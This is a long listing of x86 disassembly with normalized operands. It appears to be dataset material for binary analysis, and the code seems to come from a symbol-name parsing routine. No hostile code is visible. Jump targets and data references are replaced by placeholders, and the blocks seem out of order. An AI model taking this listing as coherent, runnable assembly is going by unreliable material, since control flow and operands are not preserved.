mov ecx 0x1000
je r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
lea ecx [ ebp - 0x20 ]
call sub_42d2c8
mov eax [ ebp - 0x4 ]
mov ecx 0x7c00
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] ebx
and [ ebp - 0xc ] edi
cmp [ ebp - 0xc ] 0x800
sete al
mov [ ebp - 0x8 ] eax
test eax eax
mov eax ebx
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax ebx
and eax edi
sub eax 0x800
jmp r-xdata
mov edx ebx
and edx ecx
cmp edx 0x6800
jne r-xdata
and eax ecx
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov esi 0x1000
mov eax ebx
je r-xdata
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x8 ]
call sub_42dfcc
cmp [ ebp - 0x8 ] 0x0
mov eax ebx
je r-xdata
mov eax ebx
and eax 0x1b00
cmp eax ecx
je r-xdata
test eax eax
je r-xdata
and eax esi
and eax 0x400
jmp r-xdata
mov edx ebx
and edx ecx
cmp edx 0x7000
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
and eax ecx
and eax 0x400
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx ebx
and edx 0x1b00
sub edx esi
neg edx
sbb edx edx
inc edx
neg eax
sbb eax eax
test edx eax
je r-xdata
test eax eax
je r-xdata
test eax eax
jne r-xdata
test ebx 0x4000
je r-xdata
mov eax ebx
and eax 0x1b00
cmp eax 0x1100
je r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax edi
sub eax 0x800
jmp r-xdata
push r--data
jmp r-xdata
mov edx ebx
and edx ecx
cmp edx 0x6000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
test edx edx
je r-xdata
mov eax [ rw-data ]
mov ecx eax
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
cmp eax 0x1200
je r-xdata
and eax esi
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
lea ecx [ ebp - 0x20 ]
call sub_42d581
jmp r-xdata
test eax eax
jne r-xdata
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_42d7f3
mov eax [ ebp - 0x20 ]
pop ecx
pop ecx
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x1c ]
push 0x7b
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_42d52f
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x40 ]
call sub_42d2c8
push r--data
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x40 ]
call sub_42d7cf
jmp r-xdata
and eax ecx
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x48 ]
push eax
call sub_42f3be
pop ecx
push eax
lea ecx [ ebp - 0x20 ]
call sub_42c890
shr eax 0x3
not eax
test al 0x1
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx ebx
and edx 0x1b00
sub edx 0x1100
neg edx
sbb edx edx
inc edx
neg eax
sbb eax eax
test edx eax
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
and edx ecx
cmp edx ecx
jne r-xdata
and [ ebp - 0x3c ] esi
and [ ebp - 0x44 ] esi
and [ ebp - 0xc ] esi
and [ ebp - 0x24 ] esi
and [ ebp - 0x2c ] esi
xor edi edi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x30 ] edi
mov eax ebx
cmp edx edi
je r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call sub_42f3be
pop ecx
push eax
lea eax [ ebp - 0x48 ]
push eax
push 0x20
lea ecx [ ebp - 0x38 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
and eax 0x6000
and eax edi
sub eax 0x800
jmp r-xdata
push r--data
jmp r-xdata
mov eax ebx
and eax 0x6000
mov eax ebx
and eax edi
sub eax 0x800
jmp r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x8 ]
call sub_42d6eb
jmp r-xdata
and eax ecx
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x48 ]
push 0x0
push eax
call sub_42d7f3
pop ecx
pop ecx
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x7b
lea eax [ ebp - 0x38 ]
push eax
call sub_42d7ab
mov ecx eax
call sub_42d4e7
push eax
lea ecx [ ebp - 0x20 ]
call sub_42d2c8
lea eax [ ebp - 0x48 ]
push eax
call sub_42d49c
mov esi 0x1000
pop ecx
test [ rw-data ] esi
jne r-xdata
mov ecx 0x1000
and eax esi
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
and eax esi
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
mov eax ebx
and eax 0x6000
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x8 ] edi
je r-xdata
cmp edx edi
je r-xdata
cmp eax edi
je r-xdata
push r--data
lea ecx [ ebp - 0x20 ]
call sub_42d581
lea eax [ ebp - 0x48 ]
push eax
call sub_42d3d4
mov eax [ rw-data ]
pop ecx
mov ecx eax
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x2c
lea ecx [ ebp - 0x38 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x3c ]
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_42d581
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_42d2c8
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx ebx
and edx 0x1b00
sub edx 0x1200
neg edx
sbb edx edx
inc edx
neg eax
sbb eax eax
test edx eax
je r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_4319c4
pop ecx
pop ecx
mov ecx [ eax ]
mov [ ebp - 0x20 ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
and eax 0x1b00
xor edx edx
cmp eax 0x1100
sete dl
neg ecx
sbb ecx ecx
test edx ecx
jne r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx eax
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x38 ]
push 0x1
push eax
call sub_42d7f3
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x34 ]
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
xor edi edi
mov eax ebx
and eax 0x700
cmp eax 0x600
jne r-xdata
mov ecx [ ebp - 0x20 ]
mov ecx eax
shr ecx 0x4
not ecx
test cl 0x1
je r-xdata
mov eax ebx
and eax ecx
cmp eax 0x7800
je r-xdata
push r--data
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp eax 0x1200
sete dl
neg ecx
sbb ecx ecx
test edx ecx
je r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_42d3d4
pop ecx
push eax
lea ecx [ ebp - 0x20 ]
call sub_42c890
shr eax 0x4
not eax
test al 0x1
je r-xdata
mov eax [ rw-data ]
and eax 0x60
cmp al 0x60
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x200
je r-xdata
cmp edx edi
je r-xdata
lea eax [ ebp - 0x38 ]
push 0x1
push eax
call sub_42d7f3
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
push 0x1
push eax
call sub_42d7f3
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x38 ]
push 0x1
push eax
call sub_42d7f3
add esp 0x18
jmp r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
test esi eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
jmp r-xdata
xor edx edx
mov esi 0x800
mov eax ebx
cmp [ ebp - 0x4 ] edx
je r-xdata
mov [ ebp - 0x20 ] ecx
and [ ebp - 0x34 ] esi
xor edi edi
mov [ ebp - 0x38 ] edi
cmp [ ebp - 0x14 ] edi
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
call sub_42d3d4
pop ecx
mov ecx eax
call sub_42d4e7
mov ecx [ eax ]
mov [ ebp - 0x20 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_42cbd2
pop ecx
push eax
lea ecx [ ebp - 0x30 ]
call sub_42c890
call sub_42cbd2
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
mov eax [ rw-data ]
shr eax 0x9
not eax
test al 0x1
je r-xdata
neg eax
sbb eax eax
inc eax
cmp eax edx
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x20
lea ecx [ ebp - 0x38 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x3c ]
push 0x20
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_42d52f
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x40 ]
call sub_42d2c8
mov ecx [ ebp - 0x40 ]
mov eax [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x1c ]
xor edi edi
push edi
push 0x8
mov ecx rw-data
call sub_42c6f8
cmp eax edi
je r-xdata
lea eax [ ebp - 0x50 ]
push edi
push eax
call sub_42cf69
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_42d2c8
test [ rw-data ] 0x1000
je r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
test [ rw-data ] 0x1000
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x38 ]
push 0x1
push eax
call sub_42d7f3
pop ecx
pop ecx
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
mov eax [ rw-data ]
shr eax 0x7
not eax
test al 0x1
je r-xdata
mov eax ebx
cmp [ ebp - 0x4 ] edx
je r-xdata
lea eax [ ebp - 0x58 ]
push edi
push eax
call sub_42cf69
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] eax
mov [ eax ] edi
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
mov edi eax
mov esi [ ebp - 0x8 ]
mov eax ebx
test esi esi
je r-xdata
push eax
lea eax [ ebp - 0x38 ]
push eax
push 0x20
lea ecx [ ebp - 0x50 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_42d2c8
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
test ebx 0x10000
je r-xdata
test [ rw-data ] 0x1000
jne r-xdata
test eax eax
je r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] edx
je r-xdata
neg eax
sbb eax eax
inc eax
cmp eax edx
je r-xdata
lea eax [ ebp - 0x58 ]
push eax
call sub_42da25
pop ecx
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x28
lea ecx [ ebp - 0x50 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x3c ]
push 0x29
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_42d52f
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_42d2c8
test esi esi
je r-xdata
test esi esi
je r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x48 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov eax ebx
and eax 0x6000
mov eax ebx
and eax 0x700
cmp eax 0x100
je r-xdata
xor eax eax
inc eax
mov eax ebx
and eax 0x700
sub eax 0x200
neg eax
sbb eax eax
inc eax
jmp r-xdata
mov eax [ rw-data ]
shr eax 0x8
not eax
test al 0x1
lea eax [ ebp - 0x58 ]
push eax
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x200
je r-xdata
push r--data
lea ecx [ ebp - 0x20 ]
call sub_42d581
mov eax ebx
and eax 0x700
cmp eax 0x600
jne r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
and eax edi
sub eax esi
neg eax
sbb eax eax
inc eax
and al 0xc0
xor edx edx
cmp al 0x40
sete dl
mov eax edx
jmp r-xdata
and eax 0x1000
and eax 0x400
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
test edx edx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
cmp eax edx
je r-xdata
call sub_42db05
pop ecx
push eax
lea ecx [ ebp - 0x20 ]
call sub_42c890
call sub_42db05
pop ecx
push eax
lea ecx [ ebp - 0x20 ]
call sub_42d2c8
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_42d2c8
test esi esi
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x14 ]
push 0x2c
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x3c ] eax
call sub_42d52f
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_42d2c8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x14 ]
push 0x2c
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_42d52f
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x40 ]
call sub_42d2c8
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax ebx
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
test edx edx
je r-xdata
test eax eax
je r-xdata
mov eax ebx
and eax edi
sub eax esi
jmp r-xdata
test edi edi
je r-xdata
mov eax [ rw-data ]
shr eax 0x2
not eax
test al 0x1
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
jne r-xdata
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x3c ]
push 0x2c
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_42d52f
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_42d2c8
jmp r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
and eax edi
sub eax 0x1000
neg eax
sbb eax eax
inc eax
and al 0xc0
xor edx edx
cmp al 0x80
sete dl
mov eax edx
jmp r-xdata
lea ecx [ ebp - 0x58 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x38 ]
mov [ edi ] eax
mov eax [ ebp - 0x1c ]
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push r--data
lea ecx [ ebp - 0x58 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x24 ]
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x44 ] eax
call sub_42d581
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_42d2c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
test edx edx
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov edi 0x1800
mov eax ebx
and eax edi
neg eax
sbb eax eax
inc eax
push 0x0
test bl 0xc0
pop eax
sete al
jmp r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push r--data
test eax eax
je r-xdata
mov eax ebx
test edx edx
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x600
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
and eax 0x6000
and eax edi
sub eax esi
jmp r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x400
jne r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
sub_430114
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov esi 0x2000
push edi
test [ rw-data ] esi
je r-xdata
mov eax [ rw-data ]
mov cl [ eax ]
cmp cl 0x3f
jne r-xdata
and [ rw-data ] 0xffffdfff
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_4318f5
or [ rw-data ] esi
pop ecx
pop ecx
test cl cl
jne r-xdata
inc eax
mov [ rw-data ] eax
cmp [ eax ] cl
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_42ccad
lea eax [ ebp - 0xc ]
push eax
call sub_42f374
mov esi [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
xor eax eax
inc eax
pop ecx
test esi esi
je r-xdata
cmp [ eax + 0x1 ] cl
jne r-xdata
and [ ebp - 0x4 ] 0x0
test ebx 0x200
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_430114
mov eax [ rw-data ]
pop ecx
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp al 0x40
je r-xdata
mov edi ebx
shr edi 0xf
and edi eax
cmp bl al
jle r-xdata
inc eax
mov [ rw-data ] eax
jmp r-xdata
mov edx 0x8000
test edi edi
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
call sub_430382
mov eax [ ebp - 0x14 ]
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
test esi esi
je r-xdata
or ebx edx
mov [ ebp - 0x8 ] ebx
or ebx 0x200
mov [ ebp - 0x8 ] ebx
cmp [ rw-data ] 0x0
je r-xdata
mov ecx 0x1000
test ecx ebx
jne r-xdata
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
push r--data
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
call sub_42d581
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_42d2c8
mov esi [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ rw-data ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] ebx
call sub_42d2c8
mov eax [ rw-data ]
cmp [ eax ] 0x40
mov esi [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_430382
mov ecx [ eax ]
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ esp ] r--data
call sub_42d581
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_42d2c8
mov esi [ ebp - 0x24 ]
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test [ rw-data ] ecx
je r-xdata
cmp al 0x40
je r-xdata
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] esi
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_42f45a
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ rw-data ]
mov eax [ ebp + 0x8 ]
test edx ebx
jne r-xdata
and [ ebp - 0x24 ] 0x0
and [ ebp - 0x20 ] 0xffff0000
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_42f45a
pop ecx
pop ecx
jmp r-xdata
sub_430382
mov edi edi
push ebp
mov ebp esp
sub esp 0xb8
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi 0xffff00ff
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] edi
mov [ esi ] ebx
mov [ ebp + 0xb ] bl
jmp r-xdata
cmp [ esi + 0x4 ] bl
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
cmp al bl
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
cmp al bl
je r-xdata
cmp al 0x40
je r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp al 0x40
je r-xdata
cmp [ rw-data ] bl
je r-xdata
push esi
lea eax [ ebp - 0x40 ]
push eax
push r--data
lea eax [ ebp - 0x48 ]
push eax
push 0x1
lea ecx [ ebp - 0x38 ]
call sub_42ccad
mov ecx eax
call sub_42d7cf
mov ecx eax
call sub_42d4e7
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
push 0x1
mov ecx esi
call sub_42cde6
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
and [ esi + 0x4 ] edi
mov [ esi + 0x4 ] 0x2
mov [ esi ] ebx
jmp r-xdata
cmp [ esi ] ebx
je r-xdata
cmp [ rw-data ] bl
je r-xdata
mov ecx [ rw-data ]
cmp [ ecx ] 0x3f
jne r-xdata
push esi
lea eax [ ebp - 0x20 ]
push eax
push r--data
lea ecx [ ebp - 0x90 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x20 ]
mov [ esi ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
cmp [ ebp + 0xb ] bl
je r-xdata
lea eax [ ebp - 0x48 ]
push esi
push eax
lea eax [ ebp - 0x40 ]
inc ecx
mov [ rw-data ] ecx
movsx eax [ ecx ]
sub eax 0x24
je r-xdata
push esi
lea eax [ ebp - 0x28 ]
push eax
push 0x5b
lea ecx [ ebp - 0x98 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x28 ]
mov [ esi ] eax
mov eax [ ebp - 0x24 ]
mov [ esi + 0x4 ] eax
mov [ ebp + 0xb ] bl
lea eax [ ebp - 0x88 ]
push esi
dec ecx
push eax
mov [ rw-data ] ecx
lea eax [ ebp - 0x38 ]
jmp r-xdata
dec eax
je r-xdata
push ebx
push 0x1
push eax
call sub_42ef5a
add esp 0xc
push 0x40
push rw-data
lea ecx [ ebp - 0x30 ]
call sub_42d0dc
push esi
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x78 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x10 ]
mov [ esi ] eax
mov eax [ ebp - 0xc ]
mov [ esi + 0x4 ] eax
mov ecx [ rw-data ]
cmp [ ecx ] 0x9
je r-xdata
sub eax 0x1a
je r-xdata
lea eax [ ebp - 0x30 ]
push eax
call sub_42ce1d
